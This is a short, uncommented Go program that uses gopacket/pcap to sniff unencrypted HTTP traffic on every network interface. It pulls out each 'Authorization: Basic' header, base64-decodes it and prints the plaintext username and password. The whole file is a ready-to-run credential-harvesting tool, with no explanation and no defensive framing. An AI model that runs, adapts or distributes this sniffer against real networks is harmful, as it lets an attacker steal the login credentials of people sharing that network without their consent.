package main

import (
  "fmt"
  "log"
  "bytes"
  "bufio"
  "strings"
  "encoding/base64"
  "github.com/google/gopacket"
  "github.com/google/gopacket/pcap"
)

var (
  snaplen = int32(1600)
  promisc = false
  timeout = pcap.BlockForever
  filter = "tcp and dst port 80"
)

func main() {
  devices, err := pcap.FindAllDevs()
  if err != nil {
    log.Panicln(err)
  }  
  for _, device := range devices {
    go handle(device.Name)
  }
  for {}
}

func handle(iface string) {
  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
  if err != nil {
    log.Panicln(err)
  }
  defer handle.Close()
  
  if err := handle.SetBPFFilter(filter); err != nil {
    log.Panicln(err)
  }
  
  source := gopacket.NewPacketSource(handle, handle.LinkType())
  for packet := range source.Packets() {
    appLayer := packet.ApplicationLayer()
    if appLayer == nil {
      continue
    }
    payload := appLayer.Payload()
    
    if bytes.Contains(payload, []byte("HTTP/1.1")) {
      scanner := bufio.NewScanner(strings.NewReader(string(payload)))
      for scanner.Scan() {
        line := scanner.Text()
        if strings.Contains(line, "Authorization: Basic ") {
          encoded := line[21:len(line)]
          decoded, err := base64.StdEncoding.DecodeString(encoded)
          if err != nil {
            fmt.Println("Cannot decode", encoded)
            continue
          }
          fmt.Println(packet)
          fmt.Printf("%s\n\n", decoded)
        }
      }      
    }
  }
}